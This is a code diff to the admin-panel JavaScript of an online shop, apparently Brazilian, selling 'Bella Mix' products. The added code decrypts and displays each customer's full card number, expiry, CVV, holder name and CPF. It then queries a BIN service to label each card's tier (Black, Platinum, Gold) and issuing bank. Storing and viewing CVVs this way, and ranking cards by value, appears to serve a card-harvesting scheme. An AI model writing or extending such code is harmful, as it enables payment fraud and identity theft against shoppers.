@@ -1,4 +1,4 @@
-const adminIcons = {"lock": "<rect x=\"3\" y=\"11\" width=\"18\" height=\"11\" rx=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/>", "bag": "<path d=\"m6 2-3 4v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z\"/><path d=\"M3 6h18M16 10a4 4 0 0 1-8 0\"/>", "card": "<rect x=\"2\" y=\"4\" width=\"20\" height=\"16\" rx=\"2\"/><path d=\"M2 10h20\"/>", "refresh": "<path d=\"M3 11a9 9 0 0 1 15.5-6.5L21 7M21 3v4h-4M21 13a9 9 0 0 1-15.5 6.5L3 17M3 21v-4h4\"/>", "logout": "<path d=\"M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9\"/>", "search": "<circle cx=\"11\" cy=\"11\" r=\"8\"/><path d=\"m21 21-4.3-4.3\"/>", "calendar": "<rect x=\"3\" y=\"4\" width=\"18\" height=\"18\" rx=\"2\"/><path d=\"M16 2v4M8 2v4M3 10h18\"/>", "sort": "<path d=\"m3 16 4 4 4-4M7 20V4m14 4-4-4-4 4M17 4v16\"/>", "x": "<path d=\"m18 6-12 12M6 6l12 12\"/>", "phone": "<path d=\"M22 16.9v3a2 2 0 0 1-2.2 2 19.8 19.8 0 0 1-8.6-3.1 19.5 19.5 0 0 1-6-6A19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7c.1 1 .4 1.9.7 2.8a2 2 0 0 1-.5 2.1L8 9.9a16 16 0 0 0 6 6l1.3-1.3a2 2 0 0 1 2.1-.5c.9.3 1.8.6 2.8.7a2 2 0 0 1 1.8 2.1Z\"/>", "mail": "<rect x=\"2\" y=\"4\" width=\"20\" height=\"16\" rx=\"2\"/><path d=\"m22 7-10 6L2 7\"/>", "package": "<path d=\"m7.5 4.3 9 5.2M21 8l-9 5-9-5m9 14V12\"/><path d=\"M21 16V8a2 2 0 0 0-1-1.7l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.7l7 4a2 2 0 0 0 2 0l7-4a2 2 0 0 0 1-1.7Z\"/>", "user": "<path d=\"M20 21v-2a7 7 0 0 0-14 0v2\"/><circle cx=\"13\" cy=\"7\" r=\"4\"/>", "send": "<path d=\"m22 2-7 20-4-9-9-4Z\"/><path d=\"M22 2 11 13\"/>"};
+const adminIcons = {"lock": "<rect x=\"3\" y=\"11\" width=\"18\" height=\"11\" rx=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/>", "bag": "<path d=\"m6 2-3 4v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z\"/><path d=\"M3 6h18M16 10a4 4 0 0 1-8 0\"/>", "card": "<rect x=\"2\" y=\"4\" width=\"20\" height=\"16\" rx=\"2\"/><path d=\"M2 10h20\"/>", "refresh": "<path d=\"M3 11a9 9 0 0 1 15.5-6.5L21 7M21 3v4h-4M21 13a9 9 0 0 1-15.5 6.5L3 17M3 21v-4h4\"/>", "logout": "<path d=\"M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9\"/>", "search": "<circle cx=\"11\" cy=\"11\" r=\"8\"/><path d=\"m21 21-4.3-4.3\"/>", "calendar": "<rect x=\"3\" y=\"4\" width=\"18\" height=\"18\" rx=\"2\"/><path d=\"M16 2v4M8 2v4M3 10h18\"/>", "sort": "<path d=\"m3 16 4 4 4-4M7 20V4m14 4-4-4-4 4M17 4v16\"/>", "x": "<path d=\"m18 6-12 12M6 6l12 12\"/>", "phone": "<path d=\"M22 16.9v3a2 2 0 0 1-2.2 2 19.8 19.8 0 0 1-8.6-3.1 19.5 19.5 0 0 1-6-6A19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7c.1 1 .4 1.9.7 2.8a2 2 0 0 1-.5 2.1L8 9.9a16 16 0 0 0 6 6l1.3-1.3a2 2 0 0 1 2.1-.5c.9.3 1.8.6 2.8.7a2 2 0 0 1 1.8 2.1Z\"/>", "mail": "<rect x=\"2\" y=\"4\" width=\"20\" height=\"16\" rx=\"2\"/><path d=\"m22 7-10 6L2 7\"/>", "package": "<path d=\"m7.5 4.3 9 5.2M21 8l-9 5-9-5m9 14V12\"/><path d=\"M21 16V8a2 2 0 0 0-1-1.7l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.7l7 4a2 2 0 0 0 2 0l7-4a2 2 0 0 0 1-1.7Z\"/>", "user": "<path d=\"M20 21v-2a7 7 0 0 0-14 0v2\"/><circle cx=\"13\" cy=\"7\" r=\"4\"/>", "send": "<path d=\"m22 2-7 20-4-9-9-4Z\"/><path d=\"M22 2 11 13\"/>", "eye": "<path d=\"M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z\"/><circle cx=\"12\" cy=\"12\" r=\"3\"/>", "eye-off": "<path d=\"M9.88 9.88a3 3 0 1 0 4.24 4.24\"/><path d=\"M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68\"/><path d=\"M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61\"/><line x1=\"2\" x2=\"22\" y1=\"2\" y2=\"22\"/>"};
 const icon = (name) => `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">${adminIcons[name] || ""}</svg>`;
 document.querySelectorAll("[data-icon]").forEach((element) => { element.innerHTML = icon(element.dataset.icon); });
 const $ = (id) => document.getElementById(id);
@@ -47,6 +47,7 @@ const normalizeBellaOrder = (order) => ({
   transaction_id: order.transaction_id,
   paymentMethod: order.metodo_pagamento,
   cardSummary: order.cardSummary,
+  cardEncrypted: !!order.cardEncrypted,
   siteVariant: 'video',
   shippingTracking: order.codigo_rastreio ? { code: order.codigo_rastreio } : null,
 });
@@ -70,6 +71,39 @@ const whatsapp = (order) => {
     : `Olá ${firstName}! Vi que você iniciou uma compra da ${order.siteVariant === 'video' ? 'Bella Mix' : 'escova GOKOCO'} mas não finalizou. Posso te ajudar? 😊`;
   return `https://wa.me/${number}?text=${encodeURIComponent(message)}`;
 };
+
+const formatCardNumber = (value) => String(value || '').replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+const cardBrandLabel = (scheme) => scheme ? scheme.charAt(0).toUpperCase() + String(scheme).slice(1).toLowerCase() : '';
+const cardTierLabel = (brand) => {
+  const b = String(brand || '').toLowerCase();
+  if (!b) return '';
+  if (b.includes('black') || b.includes('infinite') || b.includes('ultra')) return 'Black';
+  if (b.includes('platinum')) return 'Platinum';
+  if (b.includes('gold')) return 'Gold';
+  if (b.includes('classic') || b.includes('standard')) return 'Classic';
+  if (b.includes('electron')) return 'Electron';
+  return brand;
+};
+const tierColor = (tier) => tier === 'Black' ? '#1f1f1f' : tier === 'Platinum' ? '#7c7c9b' : tier === 'Gold' ? '#b8860b' : '#3b82f6';
+const formatCpfDisplay = (cpf) => {
+  if (!cpf) return null;
+  const d = String(cpf).replace(/\D/g, '');
+  return d.length === 11 ? `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}` : cpf;
+};
+async function lookupBin(numero) {
+  const bin = String(numero || '').replace(/\D/g, '').slice(0, 6);
+  if (bin.length < 6) return null;
+  try {
+    const res = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { 'Accept-Version': '3' } });
+    return res.ok ? await res.json() : null;
+  } catch { return null; }
+}
+function cardPanelHtml(card, bin) {
+  const tier = cardTierLabel(bin?.brand);
+  const brand = cardBrandLabel(bin?.scheme);
+  const cpf = formatCpfDisplay(card.cpf);
+  return `<div class="card-visual"><div class="card-visual-top"><span class="card-visual-label">Cartão</span><span class="card-visual-tags">${tier ? `<span class="card-tier" style="background:${tierColor(tier)}">${esc(tier)}</span>` : ''}${brand ? `<span class="card-brand">${esc(brand)}</span>` : ''}<span class="card-lock">${icon('lock')}</span></span></div><div class="card-number">${esc(formatCardNumber(card.numero))}</div><div class="card-visual-bottom"><div><p class="card-field-label">Titular</p><p class="card-field-value">${esc(card.nome)}</p>${cpf ? `<p class="card-field-label card-field-gap">CPF do Titular</p><p class="card-field-value card-field-mono">${esc(cpf)}</p>` : ''}</div><div class="card-field-right"><p class="card-field-label">Validade</p><p class="card-field-value card-field-mono">${esc(card.validade)}</p></div><div class="card-field-right"><p class="card-field-label">CVV</p><div class="card-cvv"><p class="card-field-value card-field-mono card-cvv-value" data-shown="1" data-cvv="${esc(card.cvv)}">${esc(card.cvv)}</p><button type="button" data-cvv-toggle aria-label="Mostrar ou ocultar CVV">${icon('eye-off')}</button></div></div></div><span class="card-deco card-deco-a"></span><span class="card-deco card-deco-b"></span></div>${bin?.bank?.name ? `<p class="card-bank">Banco: ${esc(bin.bank.name)}</p>` : ''}`;
+}
 
 async function api(path, options = {}) {
   const response = await fetch(`/api/admin/${path}`, {
@@ -168,8 +202,8 @@ function renderOrders() {
     const recoveryLine = !external && order.siteVariant !== 'video' && (recoveryCount > 0 || (order.status === 'pending' && recoveryEligible))
       ? `<div class="order-detail recovery-status" title="${esc(recovery.error || '')}">${icon('mail')}<span>Recuperação por e-mail: <strong>${recoveryCount}/3 enviado${recoveryCount === 1 ? '' : 's'}</strong> · ${esc(recoveryStatus)}</span></div>` : '';
     const tx = order.transaction_id ? `<div class="tx-line">Transação: ${esc(order.transaction_id)}</div>` : '';
-    const cardLine = order.siteVariant === 'video' && order.paymentMethod === 'card' && order.cardSummary
-      ? `<div class="order-detail"><button class="button outline" type="button" data-card-summary>Ver cartão</button><span class="card-summary" hidden>${esc(order.cardSummary)}</span></div>` : '';
+    const cardLine = order.siteVariant === 'video' && order.paymentMethod === 'card' && (order.cardSummary || order.cardEncrypted)
+      ? `<div class="order-card-data"><button class="button outline" type="button" data-card-summary>${icon('card')} Ver dados do cartão</button><div class="card-panel" hidden>${order.cardSummary ? `<span class="card-summary">${esc(order.cardSummary)}</span>` : ''}</div></div>` : '';
     const tracking = order.shippingTracking || {};
     const trackingCode = tracking.code || '';
     const selectedStage = tracking.status || 'confirmed';
@@ -326,12 +360,53 @@ $('reset-filters').addEventListener('click', () => {
 $('pagination').addEventListener('click', (event) => { const button = event.target.closest('[data-page]'); if (!button || button.disabled) return; page = Number(button.dataset.page); renderOrders(); window.scrollTo(0, 0); });
 let emailOrderId = null;
 function closeEmailModal() { $('email-modal').hidden = true; emailOrderId = null; }
-$('orders').addEventListener('click', (event) => {
+$('orders').addEventListener('click', async (event) => {
+  const cvvToggle = event.target.closest('[data-cvv-toggle]');
+  if (cvvToggle) {
+    const value = cvvToggle.closest('.card-cvv')?.querySelector('.card-cvv-value');
+    if (value) {
+      const shown = value.dataset.shown === '1';
+      value.dataset.shown = shown ? '0' : '1';
+      value.textContent = shown ? '•••' : value.dataset.cvv;
+      cvvToggle.innerHTML = icon(shown ? 'eye' : 'eye-off');
+    }
+    return;
+  }
   const cardButton = event.target.closest('[data-card-summary]');
   if (cardButton) {
-    const summary = cardButton.parentElement.querySelector('.card-summary');
-    summary.hidden = !summary.hidden;
-    cardButton.textContent = summary.hidden ? 'Ver cartão' : 'Ocultar cartão';
+    const panel = cardButton.parentElement.querySelector('.card-panel');
+    const order = orders.find((item) => item.id === cardButton.closest('[data-order-id]')?.dataset.orderId);
+    if (!panel || !order) return;
+    if (!panel.hidden) { panel.hidden = true; cardButton.innerHTML = `${icon('card')} Ver dados do cartão`; return; }
+    if (!order.cardEncrypted || order.cardData) {
+      if (order.cardData) panel.innerHTML = cardPanelHtml(order.cardData, order.cardBin);
+      panel.hidden = false;
+      cardButton.innerHTML = `${icon('card')} Ocultar cartão`;
+      return;
+    }
+    cardButton.disabled = true;
+    cardButton.innerHTML = `${icon('card')} Descriptografando...`;
+    try {
+      const data = await api(`bella-card?id=${encodeURIComponent(order.id)}`);
+      if (data.summary) {
+        order.cardEncrypted = false;
+        order.cardSummary = data.summary;
+        panel.innerHTML = `<span class="card-summary">${esc(data.summary)}</span>`;
+      } else {
+        order.cardData = data.card;
+        order.cardBin = await lookupBin(data.card.numero);
+        panel.innerHTML = cardPanelHtml(order.cardData, order.cardBin);
+      }
+      panel.hidden = false;
+      cardButton.innerHTML = `${icon('card')} Ocultar cartão`;
+    } catch (error) {
+      order.cardData = null;
+      panel.innerHTML = `<span class="card-error">${esc(error.message || 'Não foi possível descriptografar o cartão.')}</span>`;
+      panel.hidden = false;
+      cardButton.innerHTML = `${icon('card')} Ocultar cartão`;
+    } finally {
+      cardButton.disabled = false;
+    }
     return;
   }
   const button = event.target.closest('[data-send-email]');
